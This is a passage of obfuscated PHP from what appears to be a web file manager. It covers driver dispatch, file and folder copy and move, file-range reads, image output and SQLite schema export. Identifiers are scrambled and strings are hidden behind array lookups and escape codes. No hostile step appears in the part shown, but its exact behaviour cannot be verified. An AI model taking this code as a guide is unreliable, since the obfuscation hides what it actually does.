$ÌúóµĞ—[$Ÿú¿ûĞö[1124]], $ÌúóµĞ—[$Ÿú¿ûĞö[1125]] == $Ÿú¿ûĞö[901] ? $Ÿú¿ûĞö[1126] : $Ÿú¿ûĞö[1127], $ÌúóµĞ—[$Ÿú¿ûĞö[1122]] == $Ê Ş¼ßå ? $Ÿú¿ûĞö[1128] : $Ÿú¿ûĞö[12], $ÌúóµĞ—[$Ÿú¿ûĞö[952]] ? strtoupper(str_replace($Ÿú¿ûĞö[11], $Ÿú¿ûĞö[12], $ÌúóµĞ—[$Ÿú¿ûĞö[952]])) : $Ÿú¿ûĞö[12]); $»ÀÒ±øÎ[] = trim(implode($Ÿú¿ûĞö[53], $¸øÈËû)); } $“äç„  = array($Ÿú¿ûĞö[1129] . $š‡’ÍÎ . $Ÿú¿ûĞö[1130], $Ÿú¿ûĞö[1131] . $š‡’ÍÎ . $Ÿú¿ûĞö[1132], implode($Ÿú¿ûĞö[50] . PHP_EOL, $»ÀÒ±øÎ), $Ÿú¿ûĞö[949]); $†Ü´š¨ï = implode(PHP_EOL, array_merge($“äç„ , $ÏŞø¼Ï²)); if ($†ŞØ…óå && $†ŞØ…óå == $Ÿú¿ûĞö[13]) { return $†Ü´š¨ï; } $«ªÇÏ»™ = array($Ÿú¿ûĞö[814] => $½²˜Ÿ¡¬, $Ÿú¿ûĞö[13] => $†Ü´š¨ï); return $†ŞØ…óå ? $«ªÇÏ»™[$†ŞØ…óå] : $«ªÇÏ»™; } public function sqlFromSqlite($û÷½ È¢, $¼”†Ã = '') { $é½²Ô¢¸ =& $_SERVER[ïëó©ÒÚ]; $³»ÔÍšŒ = $this->model()->db(); $ŞÇÁ˜Û‘ = "\x50\122\101\x47\x4d\101\x20\x54\x41\102\114\105\137\111\x4e\106\117\x20\50\47{$û÷½ È¢}\x27\x29"; $øü‡ïá = "\123\105\x4c\x45\x43\x54\x20\52\x20\106\122\117\x4d\40\x73\x71\x6c\x69\x74\x65\137\x6d\x61\163\164\145\x72\x20\127\110\x45\x52\x45\40\x74\142\154\137\156\x61\x6d\145\x20\75\x20\47{$û÷½ È¢}\x27"; $À•ƒ©æ« = $³»ÔÍšŒ->query($ŞÇÁ˜Û‘); if (empty($À•ƒ©æ«)) { $˜ŸÚ¶˜ç = array($é½²Ô¢¸[814] => $é½²Ô¢¸[12], $é½²Ô¢¸[13] => $é½²Ô¢¸[12]); return $¼”†Ã ? $˜ŸÚ¶˜ç[$¼”†Ã] : $˜ŸÚ¶˜ç; } $œ§ş»‡« = $³»ÔÍšŒ->query($øü‡ïá); $Î£ÓáÈè = $Ô’ÎŒÆò = array(); foreach ($œ§ş»‡« as $Ü–œ÷ªì) { if ($Ü–œ÷ªì[$é½²Ô¢¸[33]] == $é½²Ô¢¸[279]) { $Î£ÓáÈè[] = $Ü–œ÷ªì[$é½²Ô¢¸[1133]]; } else { $Ô’ÎŒÆò[$Ü–œ÷ªì[$é½²Ô¢¸[32]]] = $Ü–œ÷ªì[$é½²Ô¢¸[1133]]; } } $ıÍ›§Ç = array_merge(array($é½²Ô¢¸[1129] . $û÷½ È¢ . $é½²Ô¢¸[118]), $Î£ÓáÈè, array_values($Ô’ÎŒÆò)); $ıÍ›§Ç = implode($é½²Ô¢¸[71] . PHP_EOL, $ıÍ›§Ç) . $é½²Ô¢¸[71]; if ($¼”†Ã && $¼”†Ã == $é½²Ô¢¸[13]) { return $ıÍ›§Ç; } $¾ĞØƒ­ = array(); $Õüµ…óÊ = array($é½²Ô¢¸[1121] => $é½²Ô¢¸[1134], $é½²Ô¢¸[315] => $é½²Ô¢¸[1135]); $ç§•ÀÔÅ = $é½²Ô¢¸[12]; foreach ($À•ƒ©æ« as $Ü–œ÷ªì) { if ($Ü–œ÷ªì[$é½²Ô¢¸[57]] == $é½²Ô¢¸[88]) { $ç§•ÀÔÅ = $Ü–œ÷ªì[$é½²Ô¢¸[32]]; } $óí­ıÅ© = array($é½²Ô¢¸[385] . $Ü–œ÷ªì[$é½²Ô¢¸[32]] . $é½²Ô¢¸[385], isset($Õüµ…óÊ[$Ü–œ÷ªì[$é½²Ô¢¸[33]]]) ? $Õüµ…óÊ[$Ü–œ÷ªì[$é½²Ô¢¸[33]]] : $Ü–œ÷ªì[$é½²Ô¢¸[33]], $Ü–œ÷ªì[$é½²Ô¢¸[35]] == $é½²Ô¢¸[88] ? $é½²Ô¢¸[1126] : $é½²Ô¢¸[1136] . $Ü–œ÷ªì[$é½²Ô¢¸[56]], $Ü–œ÷ªì[$é½²Ô¢¸[57]] == $é½²Ô¢¸[88] ? $é½²Ô¢¸[1137] : $é½²Ô¢¸[12]); $¾ĞØƒ­[] = trim(implode($é½²Ô¢¸[53], $óí­ıÅ©)); } foreach ($Ô’ÎŒÆò as $®´ìÚ¹î => $¡üæŞÇ¼) { $—¼ÉãØ½ = str_replace($é½²Ô¢¸[1138] . $û÷½ È¢ . $é½²Ô¢¸[11], $é½²Ô¢¸[12], $®´ìÚ¹î); $Ã÷„­í = str_replace(array($é½²Ô¢¸[118], $é½²Ô¢¸[960]), $é½²Ô¢¸[385], substr($¡üæŞÇ¼, stripos($¡üæŞÇ¼, $é½²Ô¢¸[260]))); if ($—¼ÉãØ½ == $é½²Ô¢¸[1115]) { $ç³ƒá¶Ÿ = $é½²Ô¢¸[1139] . $ç§•ÀÔÅ . $é½²Ô¢¸[1140]; } else { $ç³ƒá¶Ÿ = (stripos($—¼ÉãØ½, $é½²Ô¢¸[11]) ? $é½²Ô¢¸[1141] : $é½²Ô¢¸[12]) . ($é½²Ô¢¸[1142] . $—¼ÉãØ½ . $é½²Ô¢¸[1143] . $Ã÷„­í); } $¾ĞØƒ­[] = $ç³ƒá¶Ÿ; } $¶Ÿªâù” = array($é½²Ô¢¸[1144] . $û÷½ È¢ . $é½²Ô¢¸[1145], $é½²Ô¢¸[1146] . $û÷½ È¢ . $é½²Ô¢¸[1147], implode($é½²Ô¢¸[50] . PHP_EOL, $¾ĞØƒ­), $é½²Ô¢¸[1148]); $¥Šáß±• = implode(PHP_EOL, $¶Ÿªâù”); if ($¼”†Ã && $¼”†Ã == $é½²Ô¢¸[814]) { return $¥Šáß±•; } $˜ŸÚ¶˜ç = array($é½²Ô¢¸[814] => $¥Šáß±•, $é½²Ô¢¸[13] => $ıÍ›§Ç); return $¼”†Ã ? $˜ŸÚ¶˜ç[$¼”†Ã] : $˜ŸÚ¶˜ç; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($âªø½ÚÙ, $‘éÁ‡‰) { $‘’Œ¥ =& $_SERVER[ïëó©ÒÚ]; $¶ªØ·åÄ = $‘éÁ‡‰; $GLOBALS[$‘’Œ¥[1149]] = $‘’Œ¥[1150] . $âªø½ÚÙ; Hook::trigger($‘’Œ¥[1150] . $âªø½ÚÙ . $‘’Œ¥[1151], $¶ªØ·åÄ); $ÀíÆ¨ = self::driverMake($‘éÁ‡‰[0]); if (!$ÀíÆ¨) { return !1; } if (method_exists($ÀíÆ¨, $âªø½ÚÙ)) { $ ¶‹Šøã = @call_user_func_array(array($ÀíÆ¨, $âªø½ÚÙ), $‘éÁ‡‰); } else { if (method_exists($ÀíÆ¨, $‘’Œ¥[1152])) { $ ¶‹Šøã = @call_user_func_array(array($ÀíÆ¨, $âªø½ÚÙ), $‘éÁ‡‰); } else { if (method_exists(self, $âªø½ÚÙ)) { $ ¶‹Šøã = @call_user_func_array(array(self, $âªø½ÚÙ), $‘éÁ‡‰); } else { $ ¶‹Šøã = call_user_func_array(array(parent, $âªø½ÚÙ), $‘éÁ‡‰); } } } Hook::trigger($‘’Œ¥[1150] . $âªø½ÚÙ . $‘’Œ¥[1153], $¶ªØ·åÄ, $ ¶‹Šøã); return $ ¶‹Šøã; } public static function init($ÕÒ§Ì¨) { return self::driverMake($ÕÒ§Ì¨); } public static function copy($â¢ó¤øè, $ô€‡²¡©, $‰Ğ—¤¯  = false, $×¯œî•‡ = false) { return self::copyMoveStart($â¢ó¤øè, $ô€‡²¡©, $‰Ğ—¤¯ , $_SERVER[ïëó©ÒÚ][564], $×¯œî•‡); } public static function move($·©Â˜Óó, $Ëí‘ Ó€, $ÃÚİ—“æ = false, $ÑÌŠÃ£ƒ = false) { return self::copyMoveStart($·©Â˜Óó, $Ëí‘ Ó€, $ÃÚİ—“æ, $_SERVER[ïëó©ÒÚ][566], $ÑÌŠÃ£ƒ); } private static function copyMoveStart($ºœØª Ï, $Î‰Õğá, $²¬×©°Ï, $ˆŸöŠ¨˜, $²Òé˜ƒä) { $³¸±¶ïí =& $_SERVER[ïëó©ÒÚ]; $‘ï‘—Š = array($ºœØª Ï, $Î‰Õğá, $²¬×©°Ï, $²Òé˜ƒä); Hook::trigger($³¸±¶ïí[1150] . $ˆŸöŠ¨˜ . $³¸±¶ïí[1151], $‘ï‘—Š); $ôÒ×ªĞ = self::copyMove($ºœØª Ï, $Î‰Õğá, $²¬×©°Ï, $ˆŸöŠ¨˜, $²Òé˜ƒä); Hook::trigger($³¸±¶ïí[1150] . $ˆŸöŠ¨˜ . $³¸±¶ïí[1153], $‘ï‘—Š, $ôÒ×ªĞ); return $ôÒ×ªĞ; } public static function saveFile($§ÇÌ, $Áçı®…â, $û“†Ğª‘ = true) { $ï÷ÕÜ°° =& $_SERVER[ïëó©ÒÚ]; $®ÊªÈ¬® = self::info($Áçı®…â); $Â‘Õ²ÁÕ = self::driverMake($§ÇÌ); $ş­ˆ¼éÚ = self::driverMake($Áçı®…â); $íÃ‘˜¨ = !1; if ($ş­ˆ¼éÚ->pathParse[$ï÷ÕÜ°°[1154]]) { $íÃ‘˜¨ = $ş­ˆ¼éÚ; $Ê«…Ïˆ¤ = $ş­ˆ¼éÚ->pathParse[$ï÷ÕÜ°°[1154]]; $ş­ˆ¼éÚ = self::driverMake($Ê«…Ïˆ¤); } if ($Â‘Õ²ÁÕ->pathParse[$ï÷ÕÜ°°[1154]]) { $òÇ¶êÏ€ = $Â‘Õ²ÁÕ->pathParse[$ï÷ÕÜ°°[1154]]; $Â‘Õ²ÁÕ = self::driverMake($òÇ¶êÏ€); } $ìîÓ—ù = $ş­ˆ¼éÚ->pathFather($Áçı®…â); $†ƒéüªÒ = !0; if (!$û“†Ğª‘ && self::driverIsSame($Â‘Õ²ÁÕ, $ş­ˆ¼éÚ)) { $†ƒéüªÒ = !1; } $•½ªŞ®î = self::copyFile($Â‘Õ²ÁÕ, $§ÇÌ, $ş­ˆ¼éÚ, $ìîÓ—ù, $®ÊªÈ¬®[$ï÷ÕÜ°°[32]], $†ƒéüªÒ); if ($íÃ‘˜¨) { $•½ªŞ®î = $íÃ‘˜¨->getPathOuter($•½ªŞ®î); } return $•½ªŞ®î; } private static function copyMove($ß—É×™°, $›Ú°åŞ‹, $Ù—™ò¾, $¥“Åú¬ , $»İÛ»Âü = false) { $Àù•¼Éœ =& $_SERVER[ïëó©ÒÚ]; if (!$ß—É×™° || $ß—É×™° == $Àù•¼Éœ[8] || !$›Ú°åŞ‹) { return !1; } ignore_timeout(); $ƒÖÜÜÇ© = self::driverMake($ß—É×™°); $±ƒïÒïˆ = self::driverMake($›Ú°åŞ‹); $‡Î‹ÈÔ© = $¥“Åú¬  == $Àù•¼Éœ[566]; $‡³é¶Ì = !1; if ($±ƒïÒïˆ->pathParse[$Àù•¼Éœ[1154]]) { $‡³é¶Ì = $±ƒïÒïˆ; $›Ú°åŞ‹ = $±ƒïÒïˆ->pathParse[$Àù•¼Éœ[1154]]; $±ƒïÒïˆ = self::driverMake($›Ú°åŞ‹); } if ($ƒÖÜÜÇ©->pathParse[$Àù•¼Éœ[1154]]) { $ß—É×™° = $ƒÖÜÜÇ©->pathParse[$Àù•¼Éœ[1154]]; $ƒÖÜÜÇ© = self::driverMake($ß—É×™°); } self::check($ƒÖÜÜÇ©, $ß—É×™°, $±ƒïÒïˆ, $›Ú°åŞ‹); Hook::trigger($Àù•¼Éœ[1155], $ƒÖÜÜÇ©, $ß—É×™°, $±ƒïÒïˆ, $›Ú°åŞ‹); $‚—ôºê = self::driverIsSame($ƒÖÜÜÇ©, $±ƒïÒïˆ); if ($‚—ôºê) { if ($¥“Åú¬  == $Àù•¼Éœ[566] && !method_exists($±ƒïÒïˆ, $Àù•¼Éœ[1156]) && trim($›Ú°åŞ‹, $Àù•¼Éœ[8]) == trim($±ƒïÒïˆ->pathFather($ß—É×™°), $Àù•¼Éœ[8])) { if ($ƒÖÜÜÇ©->pathThis($ß—É×™°) != $»İÛ»Âü && !$ƒÖÜÜÇ©->isTypeObject()) { return $ƒÖÜÜÇ©->rename($ß—É×™°, $»İÛ»Âü); } return $±ƒïÒïˆ->getPathOuter($ß—É×™°); } if (method_exists($±ƒïÒïˆ, $¥“Åú¬ )) { return $±ƒïÒïˆ->{$¥“Åú¬ }($ß—É×™°, $›Ú°åŞ‹, $Ù—™ò¾, $»İÛ»Âü); } } if ($‚—ôºê && $¥“Åú¬  == $Àù•¼Éœ[566] && $±ƒïÒïˆ->getType() == $Àù•¼Éœ[106]) { $îá¤Ö” = $±ƒïÒïˆ->movePath($ß—É×™°, $›Ú°åŞ‹, $»İÛ»Âü); if ($îá¤Ö”) { return $îá¤Ö”; } } $÷â†©Ş = $ƒÖÜÜÇ©->isFile($ß—É×™°); if (!$÷â†©Ş && $±ƒïÒïˆ->getType() == $Àù•¼Éœ[768] && $ƒÖÜÜÇ©->getType() == $Àù•¼Éœ[106]) { $îá¤Ö” = $±ƒïÒïˆ->copyFolderFromIO($ƒÖÜÜÇ©, $ß—É×™°, $›Ú°åŞ‹, $Ù—™ò¾, $‡Î‹ÈÔ©, $»İÛ»Âü); } else { $îá¤Ö” = self::copyPath($ƒÖÜÜÇ©, $ß—É×™°, $±ƒïÒïˆ, $›Ú°åŞ‹, $Ù—™ò¾, $‡Î‹ÈÔ©, $÷â†©Ş, $»İÛ»Âü); } if ($îá¤Ö” && $‡Î‹ÈÔ©) { $ƒÖÜÜÇ©->remove($ß—É×™°); } if ($‡³é¶Ì) { $îá¤Ö” = $‡³é¶Ì->getPathOuter($îá¤Ö”); } return $îá¤Ö”; } private static function check($Ÿ¬±×…„, $»Å¼æıä, $ƒ¨ëøƒÔ, &$ıãµ¾©) { $—Ù³ş¼½ =& $_SERVER[ïëó©ÒÚ]; if (self::driverIsSame($Ÿ¬±×…„, $ƒ¨ëøƒÔ) && $Ÿ¬±×…„->isFolder($»Å¼æıä) && $Ÿ¬±×…„->isParentOf($»Å¼æıä, $ıãµ¾©)) { show_json(LNG($—Ù³ş¼½[1157]), !1); } if (!$Ÿ¬±×…„->exist($»Å¼æıä)) { show_json(LNG($—Ù³ş¼½[105]), !1); } } private static function copyPath($‘Ÿ§ëÏÉ, $¬”©ÄüÇ, $ª›¬Èî, $±é®”·„, $áèû¡Äà, $«ˆáî¿¯, $³ôÔ¿, $ÌÇ¶«ÆÇ = false, $ß¥¥ûú² = true) { $‡Û³ÜµÉ =& $_SERVER[ïëó©ÒÚ]; $¨ïìå¥ = empty($ÌÇ¶«ÆÇ) && $ÌÇ¶«ÆÇ !== $‡Û³ÜµÉ[197] ? $‘Ÿ§ëÏÉ->pathThis($¬”©ÄüÇ) : $ÌÇ¶«ÆÇ; if ($áèû¡Äà) { $€Øã‹ÏŠ = $ª›¬Èî->fileNameExist($±é®”·„, $¨ïìå¥); $ÓÂÈ³Îº = $¨ïìå¥; $¨ïìå¥ = $ª›¬Èî->fileNameAuto($±é®”·„, $¨ïìå¥, $áèû¡Äà, !$³ôÔ¿); if (!$€Øã‹ÏŠ || $ÓÂÈ³Îº != $¨ïìå¥) { $áèû¡Äà = !1; } if ($ß¥¥ûú² && !$áèû¡Äà) { $ª›¬Èî->_data[$‡Û³ÜµÉ[1158]] = !0; } } if ($³ôÔ¿) { return self::copyFile($‘Ÿ§ëÏÉ, $¬”©ÄüÇ, $ª›¬Èî, $±é®”·„, $¨ïìå¥, $«ˆáî¿¯); } if ($áèû¡Äà == REPEAT_RENAME_FOLDER) { $áèû¡Äà = !1; } $¥¿ªÆşû = rtrim($±é®”·„, $‡Û³ÜµÉ[8]) . $‡Û³ÜµÉ[8] . $¨ïìå¥; $éÑä­€É = $ª›¬Èî->mkdir($ª›¬Èî->getPath($¥¿ªÆşû), $áèû¡Äà); $±é®”·„ = $ª›¬Èî->getPathInner($éÑä­€É); $’ú¦ÜĞ¤ = $‘Ÿ§ëÏÉ->listPath($¬”©ÄüÇ, !0); $’ú¦ÜĞ¤ = is_array($’ú¦ÜĞ¤) ? $’ú¦ÜĞ¤ : array($‡Û³ÜµÉ[83] => array(), $‡Û³ÜµÉ[82] => array()); $–÷ÔÛÂ† = array_merge($’ú¦ÜĞ¤[$‡Û³ÜµÉ[83]], $’ú¦ÜĞ¤[$‡Û³ÜµÉ[82]]); foreach ($–÷ÔÛÂ† as $Ğ®¯§ç) { $õå«¸°• = $Ğ®¯§ç[$‡Û³ÜµÉ[33]] == $‡Û³ÜµÉ[199]; $¬”©ÄüÇ = $‘Ÿ§ëÏÉ->getPathInner($Ğ®¯§ç[$‡Û³ÜµÉ[84]]); $­àÊ¤Í = self::copyPath($‘Ÿ§ëÏÉ, $¬”©ÄüÇ, $ª›¬Èî, $±é®”·„, $áèû¡Äà, $«ˆáî¿¯, $õå«¸°•, !1, !1); if (!$­àÊ¤Í) { IO::errorTips($‡Û³ÜµÉ[1159] . $¬”©ÄüÇ . $‡Û³ÜµÉ[70] . $±é®”·„); } } self::copyMoveKeepInfo($‘Ÿ§ëÏÉ, $¬”©ÄüÇ, $éÑä­€É); return $éÑä­€É; } private static function copyFile($±€ªÕ»ú, $æÁ…á’Ì, $¢öş“ÍÊ, $±‹ĞÚ»®, $ãËÉè­», $—úÑ±Åö) { $˜©Ôªİ™ =& $_SERVER[ïëó©ÒÚ]; $±‹ĞÚ»® = $¢öş“ÍÊ->getPath(rtrim($±‹ĞÚ»®, $˜©Ôªİ™[8]) . $˜©Ôªİ™[8] . $ãËÉè­»); $‚Øğ¿– = $˜©Ôªİ™[1160] . time() . rand_string(5); Hook::trigger($˜©Ôªİ™[1161], $±€ªÕ»ú, $æÁ…á’Ì, $¢öş“ÍÊ, $±‹ĞÚ»®, $ãËÉè­», $‚Øğ¿–); if (self::driverIsSame($±€ªÕ»ú, $¢öş“ÍÊ)) { if ($—úÑ±Åö) { $Ğ ¥öé = $¢öş“ÍÊ->moveFile($æÁ…á’Ì, $±‹ĞÚ»®); } else { $Ğ ¥öé = $¢öş“ÍÊ->copyFile($æÁ…á’Ì, $±‹ĞÚ»®); } Hook::trigger($˜©Ôªİ™[1162], $±€ªÕ»ú, $æÁ…á’Ì, $¢öş“ÍÊ, $±‹ĞÚ»®, $ãËÉè­», $Ğ ¥öé); self::copyMoveKeepInfo($±€ªÕ»ú, $æÁ…á’Ì, $Ğ ¥öé); return $Ğ ¥öé; } $Şş‰ÇĞ = TEMP_FILES; if ($GLOBALS[$˜©Ôªİ™[6]][$˜©Ôªİ™[89]][$˜©Ôªİ™[806]]) { $Şş‰ÇĞ = $GLOBALS[$˜©Ôªİ™[6]][$˜©Ôªİ™[89]][$˜©Ôªİ™[806]]; } $ô©ƒ‘ § = $Şş‰ÇĞ; mk_dir($ô©ƒ‘ §); $í·–åèÉ = $ô©ƒ‘ § . $‚Øğ¿–; $ÙÂÁ™Õ­ = $í·–åèÉ; $í·–åèÉ = $±€ªÕ»ú->download($æÁ…á’Ì, $í·–åèÉ); $í·–åèÉ = $±€ªÕ»ú->iconvApp($í·–åèÉ); if (substr($í·–åèÉ, strlen($Şş‰ÇĞ)) == $Şş‰ÇĞ) { $—úÑ±Åö = !0; } $Ğ ¥öé = $¢öş“ÍÊ->upload($±‹ĞÚ»®, $í·–åèÉ, $—úÑ±Åö); self::remove($ÙÂÁ™Õ­); Hook::trigger($˜©Ôªİ™[1162], $±€ªÕ»ú, $æÁ…á’Ì, $¢öş“ÍÊ, $±‹ĞÚ»®, $ãËÉè­», $Ğ ¥öé); self::copyMoveKeepInfo($±€ªÕ»ú, $æÁ…á’Ì, $Ğ ¥öé); return $Ğ ¥öé; } private static function copyMoveKeepInfo($½Ó ¯’, $âÚ­ĞÔ«, $ç š–‚½) { if (!$ç š–‚½) { return; } $äŠÅ­ ÷ = $½Ó ¯’->info($âÚ­ĞÔ«); if (!is_array($äŠÅ­ ÷)) { return; } IO::setModifyTime($ç š–‚½, $äŠÅ­ ÷[$_SERVER[ïëó©ÒÚ][85]]); } public static function pathFather($‡¤œ¦ù) { $…÷Ç×‚Ë = IO::init($‡¤œ¦ù); $Úû‹Üµ÷ = $…÷Ç×‚Ë->pathFather($…÷Ç×‚Ë->path); return $…÷Ç×‚Ë->getPathOuter($Úû‹Üµ÷); } public static function fileOut($”½ìÒàœ, $€˜´ôö = false, $ı¿âú› = false, $Üö·Üì = '') { $¼½‚¾Æ´ = self::driverMake($”½ìÒàœ); if ($¼½‚¾Æ´->isFileOutServer()) { return $¼½‚¾Æ´->fileOutServer($”½ìÒàœ, $€˜´ôö, $ı¿âú›, $Üö·Üì); } return $¼½‚¾Æ´->fileOut($”½ìÒàœ, $€˜´ôö, $ı¿âú›, $Üö·Üì); } public static function fileOutImage($´—ä‚Ğ, $’«‚´Äñ = 250) { $Ä‹ìŞÉÙ = array(250, 600, 1200, 2000, 3000, 5000); for ($Õ€˜Éíœ = 0; $Õ€˜Éíœ < count($Ä‹ìŞÉÙ); $Õ€˜Éíœ++) { if ($Õ€˜Éíœ == 0 && $’«‚´Äñ <= $Ä‹ìŞÉÙ[$Õ€˜Éíœ]) { $’«‚´Äñ = $Ä‹ìŞÉÙ[$Õ€˜Éíœ]; break; } else { if ($’«‚´Äñ > $Ä‹ìŞÉÙ[$Õ€˜Éíœ - 1] && $’«‚´Äñ <= $Ä‹ìŞÉÙ[$Õ€˜Éíœ]) { $’«‚´Äñ = $Ä‹ìŞÉÙ[$Õ€˜Éíœ]; break; } else { if ($Õ€˜Éíœ == count($Ä‹ìŞÉÙ) - 1 && $’«‚´Äñ > $Ä‹ìŞÉÙ[$Õ€˜Éíœ]) { $’«‚´Äñ = $Ä‹ìŞÉÙ[$Õ€˜Éíœ]; break; } } } } $ß³æ¿ÙÅ = self::driverMake($´—ä‚Ğ); if ($ß³æ¿ÙÅ->isFileOutServer()) { return $ß³æ¿ÙÅ->fileOutImageServer($´—ä‚Ğ, $’«‚´Äñ); } return $ß³æ¿ÙÅ->fileOutImage($´—ä‚Ğ, $’«‚´Äñ); } private static function driverIsSame($Ñ‰–Á«ö, $¬Ë¡ì‹) { $¹Ş‡æÈ =& $_SERVER[ïëó©ÒÚ]; $ò¬®¥¸© = $Ñ‰–Á«ö->getType(); $½³İŠºœ = $¬Ë¡ì‹->getType(); if ($ò¬®¥¸© != $½³İŠºœ) { return !1; } if ($ò¬®¥¸© == $¹Ş‡æÈ[768]) { return !0; } if ($ò¬®¥¸© == $¹Ş‡æÈ[106]) { return !0; } if ($Ñ‰–Á«ö->pathDriver == $¬Ë¡ì‹->pathDriver) { return !0; } return !1; } public static function copyUpdate($‹áß½¹², $·àËÀ‡) { $ÍÃ»–ğ¦ =& $_SERVER[ïëó©ÒÚ]; if (!IO::exist($‹áß½¹²)) { return !1; } if (!IO::exist($·àËÀ‡)) { IO::mkdir($·àËÀ‡); } $ÛĞ€“÷† = self::_listAll($‹áß½¹²); $¢œÅêŒ„ = self::_listAll($·àËÀ‡); $ñÎğƒ•Û = array(); $şô¦à«´ = array(); foreach ($ÛĞ€“÷† as $…­ÁØ¢¼ => $ãÅÌ‚¼) { if (isset($¢œÅêŒ„[$…­ÁØ¢¼])) { if ($ãÅÌ‚¼[$ÍÃ»–ğ¦[75]] == 1) { continue; } if ($¢œÅêŒ„[$…­ÁØ¢¼][$ÍÃ»–ğ¦[76]] == $ãÅÌ‚¼[$ÍÃ»–ğ¦[76]]) { continue; } } if ($ãÅÌ‚¼[$ÍÃ»–ğ¦[75]] == 1) { $şô¦à«´[] = $·àËÀ‡ . $ÍÃ»–ğ¦[8] . $…­ÁØ¢¼; continue; } $ŞÉËÑ¼È = strstr(trim($…­ÁØ¢¼, $ÍÃ»–ğ¦[8]), $ÍÃ»–ğ¦[8]) ? get_path_father($…­ÁØ¢¼) : $ÍÃ»–ğ¦[12]; $ñÎğƒ•Û[] = array($ÍÃ»–ğ¦[1163] => $ãÅÌ‚¼[$ÍÃ»–ğ¦[84]], $ÍÃ»–ğ¦[1164] => rtrim($·àËÀ‡, $ÍÃ»–ğ¦[8]) . $ÍÃ»–ğ¦[8] . $ŞÉËÑ¼È, $ÍÃ»–ğ¦[1165] => $ãÅÌ‚¼); } $¶Íš«Åë = array($ÍÃ»–ğ¦[199] => $ñÎğƒ•Û, $ÍÃ»–ğ¦[75] => $şô¦à«´); Hook::trigger($ÍÃ»–ğ¦[1166], $‹áß½¹², $·àËÀ‡, $¶Íš«Åë); foreach ($şô¦à«´ as $ãÅÌ‚¼) { IO::mkdir($ãÅÌ‚¼); } foreach ($ñÎğƒ•Û as $ãÅÌ‚¼) { IO::copy($ãÅÌ‚¼[$ÍÃ»–ğ¦[1163]], $ãÅÌ‚¼[$ÍÃ»–ğ¦[1164]], REPEAT_REPLACE); } } private static function _listAll($ìó®œäŠ) { $×ôéÕñÍ =& $_SERVER[ïëó©ÒÚ]; $ìó®œäŠ = KodIO::clear($ìó®œäŠ); $Â÷¼“§– = IO::listAll($ìó®œäŠ); foreach ($Â÷¼“§– as &$é€¹ü­³) { $½ÕïåŒ£ = substr($é€¹ü­³[$×ôéÕñÍ[84]], strlen($ìó®œäŠ)); $é€¹ü­³[$×ôéÕñÍ[1167]] = trim($½ÕïåŒ£, $×ôéÕñÍ[8]); } unset($é€¹ü­³); return array_to_keyvalue($Â÷¼“§–, $×ôéÕñÍ[1167]); } public static function fileSubstr($´Çé›Ú, $ë‚‘«¥‹, $˜ìÔŒúÖ = false) { $Ô·õ÷õ =& $_SERVER[ïëó©ÒÚ]; $ÊçÏ¿£ = self::driverMake($´Çé›Ú); $ÏŒ»ôşÆ = $ÊçÏ¿£->size($´Çé›Ú); $µšğ¹÷ = $ë‚‘«¥‹; $÷›Ï«±Í = $˜ìÔŒúÖ; if ($ë‚‘«¥‹ < 0) { $ë‚‘«¥‹ = $ÏŒ»ôşÆ + $ë‚‘«¥‹; } if ($˜ìÔŒúÖ === !1) { $˜ìÔŒúÖ = $ÏŒ»ôşÆ - $ë‚‘«¥‹; } if ($ë‚‘«¥‹ + $˜ìÔŒúÖ > $ÏŒ»ôşÆ) { $˜ìÔŒúÖ = $ÏŒ»ôşÆ - $ë‚‘«¥‹; } if (!$ÏŒ»ôşÆ && $ÊçÏ¿£->getType() == $Ô·õ÷õ[106] && !$ÊçÏ¿£->exist($´Çé›Ú)) { $¯–­°Îœ = get_path_this($´Çé›Ú); $´ôı¶¬ = parse_url_query($¯–­°Îœ); if (is_array($´ôı¶¬) && isset($´ôı¶¬[$Ô·õ÷õ[32]])) { $¯–­°Îœ = urldecode($´ôı¶¬[$Ô·õ÷õ[32]]); } throw new Exception($Ô·õ÷õ[1168] . LNG($Ô·õ÷õ[1169]) . $Ô·õ÷õ[969] . clear_html($¯–­°Îœ) . $Ô·õ÷õ[12]); } if ($˜ìÔŒúÖ <= 0) { return $Ô·õ÷õ[12]; } if ($ë‚‘«¥‹ < 0 || $ë‚‘«¥‹ >= $ÏŒ»ôşÆ || $˜ìÔŒúÖ > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\145\x52\145\141\144\40\x65\x72\x72\157\162\x21\x20\x73\164\141\x72\164\75{$ë‚‘«¥‹}\73\154\x65\156\x67\x74\150\75{$˜ìÔŒúÖ}\73\x20\x73\x69\x7a\145\75{$ÏŒ»ôşÆ}\x3b"); } $ê¿Ã†“É = $ÊçÏ¿£->fileSubstr($´Çé›Ú, $ë‚‘«¥‹, $˜ìÔŒúÖ); if (!$ê¿Ã†“É && $˜ìÔŒúÖ && isset($GLOBALS[$Ô·õ÷õ[1170]])) { throw new Exception($GLOBALS[$Ô·õ÷õ[1170]][$Ô·õ÷õ[1171]]); } return $ê¿Ã†“É; } private static function driverMake(&$åŒåğƒ‹) { $À£ÜÁØ =& $_SERVER[ïëó©ÒÚ]; $€ú„ = KodIO::parse($åŒåğƒ‹); if (!self::$driverListSystem) { $˜óÖ£Ñ = Model($À£ÜÁØ[777])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($˜óÖ£Ñ, $À£ÜÁØ[399]); } if ($€ú„[$À£ÜÁØ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$€ú„[$À£ÜÁØ[399]]]) { return !1; } $åŒåğƒ‹ = $€ú„[$À£ÜÁØ[1172]]; $‚èñ¨Â = self::driverGet($€ú„, $åŒåğƒ‹); return $‚èñ¨Â; } private static function driverGet($„Åï¶ÑÍ, &$Úààéü) { $şÚú¼™¹ =& $_SERVER[ïëó©ÒÚ]; $í€ÊÙ¦§ = $„Åï¶ÑÍ[$şÚú¼™¹[1173]]; $ŒòÀ»·ø = $„Åï¶ÑÍ[$şÚú¼™¹[399]]; switch ($„Åï¶ÑÍ[$şÚú¼™¹[33]]) { case KodIO::KOD_IO: $ÔÀŞÌ§ = self::$driverListSystem[$ŒòÀ»·ø]; break; case KodIO::KOD_SOURCE: $Úààéü = $ŒòÀ»·ø . $Úààéü; $ÔÀŞÌ§ = array($şÚú¼™¹[1174] => $şÚú¼™¹[1175], $şÚú¼™¹[6] => $„Åï¶ÑÍ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¸„†•îÕ = $GLOBALS[$şÚú¼™¹[1176]]; self::$driverListUser = array_to_keyvalue($¸„†•îÕ, 